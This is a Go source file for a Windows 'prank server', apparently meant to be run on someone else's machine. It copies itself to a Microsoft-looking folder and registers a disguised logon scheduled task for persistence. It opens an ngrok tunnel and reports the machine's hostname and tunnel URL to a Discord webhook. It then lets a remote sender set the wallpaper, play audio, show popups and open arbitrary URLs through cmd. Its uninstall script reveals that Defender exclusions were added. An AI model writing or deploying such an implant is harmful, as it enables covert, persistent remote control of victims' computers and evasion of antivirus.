package main

import (
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	"golang.ngrok.com/ngrok"
	ngrokconfig "golang.ngrok.com/ngrok/config"
)

var (
	user32           = syscall.NewLazyDLL("user32.dll")
	procSPI          = user32.NewProc("SystemParametersInfoW")
	procMessageBoxW  = user32.NewProc("MessageBoxW")
	winmm            = syscall.NewLazyDLL("winmm.dll")
	procMciSendW     = winmm.NewProc("mciSendStringW")
)

type Config struct {
	Pseudo         string `json:"pseudo"`
	WebhookURL     string `json:"webhook_url"`
	NgrokAuthtoken string `json:"ngrok_authtoken"`
}

var (
	installDir string
	cfg        Config
)

func main() {
	webhook := flag.String("w", "", "Discord webhook URL")
	token   := flag.String("t", "", "ngrok auth token")
	flag.Parse()

	appdata := os.Getenv("LOCALAPPDATA")
	installDir = filepath.Join(appdata, "Microsoft", "PyService")
	os.MkdirAll(installDir, 0755)

	cfgPath := filepath.Join(installDir, "config.json")

	if *webhook != "" && *token != "" {
		hostname, _ := os.Hostname()
		cfg = Config{
			Pseudo:         hostname,
			WebhookURL:     *webhook,
			NgrokAuthtoken: *token,
		}
		data, _ := json.MarshalIndent(cfg, "", "  ")
		os.WriteFile(cfgPath, data, 0644)

		// Copie l'exe dans le dossier d'install
		self, _ := os.Executable()
		dst := filepath.Join(installDir, "svc.exe")
		if self != dst {
			copyFile(self, dst)
		}

		setupPersistence(filepath.Join(installDir, "svc.exe"))
		writeUninstall()
	} else {
		data, err := os.ReadFile(cfgPath)
		if err != nil {
			os.Exit(1)
		}
		json.Unmarshal(data, &cfg)
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/wallpaper", handleWallpaper)
	mux.HandleFunc("/audio",     handleAudio)
	mux.HandleFunc("/popup",     handlePopup)
	mux.HandleFunc("/url",       handleURL)

	handler := corsMiddleware(mux)

	ctx := context.Background()
	tun, err := ngrok.Listen(ctx,
		ngrokconfig.HTTPEndpoint(),
		ngrok.WithAuthtoken(cfg.NgrokAuthtoken),
	)
	if err != nil {
		// Fallback local si ngrok echoue
		http.ListenAndServe(":9999", handler)
		return
	}

	sendDiscord(tun.URL())
	http.Serve(tun, handler)
}

// ── Middleware CORS ───────────────────────────────────────────────────────────

func corsMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}
		next.ServeHTTP(w, r)
	})
}

// ── Handlers HTTP ─────────────────────────────────────────────────────────────

func handleWallpaper(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(32 << 20)
	file, header, err := r.FormFile("image")
	if err != nil {
		jsonError(w, "champ image manquant", 400)
		return
	}
	defer file.Close()
	ext := filepath.Ext(header.Filename)
	if ext == "" {
		ext = ".jpg"
	}
	dst := filepath.Join(installDir, "wallpaper"+ext)
	f, _ := os.Create(dst)
	io.Copy(f, file)
	f.Close()
	go setWallpaper(dst)
	jsonOK(w)
}

func handleAudio(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(32 << 20)
	file, header, err := r.FormFile("audio")
	if err != nil {
		jsonError(w, "champ audio manquant", 400)
		return
	}
	defer file.Close()
	ext := filepath.Ext(header.Filename)
	if ext == "" {
		ext = ".mp3"
	}
	tmp, _ := os.CreateTemp("", "audio*"+ext)
	io.Copy(tmp, file)
	tmp.Close()
	go playAudio(tmp.Name())
	jsonOK(w)
}

func handlePopup(w http.ResponseWriter, r *http.Request) {
	var data struct {
		Title   string `json:"title"`
		Message string `json:"message"`
	}
	json.NewDecoder(r.Body).Decode(&data)
	if data.Title == "" {
		data.Title = "Message"
	}
	go showPopup(data.Title, data.Message)
	jsonOK(w)
}

func handleURL(w http.ResponseWriter, r *http.Request) {
	var data struct {
		URL string `json:"url"`
	}
	json.NewDecoder(r.Body).Decode(&data)
	if data.URL != "" {
		go exec.Command("cmd", "/c", "start", "", data.URL).Start()
	}
	jsonOK(w)
}

// ── Actions Windows ───────────────────────────────────────────────────────────

func setWallpaper(path string) {
	abs, _ := filepath.Abs(path)
	ptr, _ := syscall.UTF16PtrFromString(abs)
	procSPI.Call(0x0014, 0, uintptr(unsafe.Pointer(ptr)), 3)
}

func playAudio(path string) {
	abs, _ := filepath.Abs(path)
	mciSend(fmt.Sprintf(`open "%s" type mpegvideo alias media`, abs))
	mciSend("play media wait")
	mciSend("close media")
	os.Remove(path)
}

func mciSend(cmd string) {
	ptr, _ := syscall.UTF16PtrFromString(cmd)
	procMciSendW.Call(uintptr(unsafe.Pointer(ptr)), 0, 0, 0)
}

func showPopup(title, message string) {
	t, _ := syscall.UTF16PtrFromString(title)
	m, _ := syscall.UTF16PtrFromString(message)
	// MB_OK | MB_ICONINFORMATION | MB_SETFOREGROUND | MB_TOPMOST
	procMessageBoxW.Call(0,
		uintptr(unsafe.Pointer(m)),
		uintptr(unsafe.Pointer(t)),
		0x00000040|0x00040000|0x00080000,
	)
}

// ── Persistence ───────────────────────────────────────────────────────────────

func writeUninstall() {
	tick := "`"
	script := `$ErrorActionPreference = "SilentlyContinue"

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
if (-not $isAdmin) {
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File ` + tick + `"$PSCommandPath` + tick + `"" -Verb RunAs -Wait
    exit
}

Write-Host ""
Write-Host "=== Desinstallation Prank Server ===" -ForegroundColor Cyan
Write-Host ""

$dir = "$env:LOCALAPPDATA\Microsoft\PyService"

$proc = Get-Process svc -ErrorAction SilentlyContinue | Where-Object { $_.MainModule.FileName -like "*PyService*" }
if ($proc) {
    $proc | Stop-Process -Force
    Write-Host "[OK] Processus svc.exe arrete" -ForegroundColor Green
} else {
    Write-Host "[--] Processus svc.exe non trouve" -ForegroundColor Yellow
}

schtasks /delete /tn "PyServiceHost" /f 2>$null
if ($LASTEXITCODE -eq 0) {
    Write-Host "[OK] Tache planifiee PyServiceHost supprimee" -ForegroundColor Green
} else {
    Write-Host "[--] Tache planifiee non trouvee" -ForegroundColor Yellow
}

Remove-MpPreference -ExclusionPath "$env:TEMP" 2>$null
Write-Host "[OK] Exclusion Defender supprimee : $env:TEMP" -ForegroundColor Green

Remove-MpPreference -ExclusionPath $dir 2>$null
Write-Host "[OK] Exclusion Defender supprimee : $dir" -ForegroundColor Green

if (Test-Path $dir) {
    Remove-Item $dir -Recurse -Force
    Write-Host "[OK] Dossier supprime : $dir" -ForegroundColor Green
} else {
    Write-Host "[--] Dossier non trouve : $dir" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "=== Desinstallation terminee ===" -ForegroundColor Cyan
Write-Host ""
Read-Host "Appuie sur Entree pour fermer"
`
	os.WriteFile(filepath.Join(installDir, "uninstall.ps1"), []byte(script), 0644)
}

func setupPersistence(exePath string) {
	exec.Command("schtasks", "/create",
		"/tn", "PyServiceHost",
		"/tr", exePath,
		"/sc", "onlogon",
		"/f", "/rl", "limited",
	).Run()
}

// ── Discord webhook ───────────────────────────────────────────────────────────

func sendDiscord(url string) {
	if cfg.WebhookURL == "" {
		return
	}
	time.Sleep(500 * time.Millisecond)
	msg := fmt.Sprintf(`{"content":"**%s** est en ligne !\nURL : `+"`"+`%s`+"`"+`"}`,
		cfg.Pseudo, url)
	http.Post(cfg.WebhookURL, "application/json", bytes.NewBufferString(msg))
}

// ── Utilitaires ───────────────────────────────────────────────────────────────

func copyFile(src, dst string) {
	in, err := os.Open(src)
	if err != nil {
		return
	}
	defer in.Close()
	out, _ := os.Create(dst)
	defer out.Close()
	io.Copy(out, in)
}

func jsonOK(w http.ResponseWriter) {
	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte(`{"status":"ok"}`))
}

func jsonError(w http.ResponseWriter, msg string, code int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	fmt.Fprintf(w, `{"error":"%s"}`, msg)
}
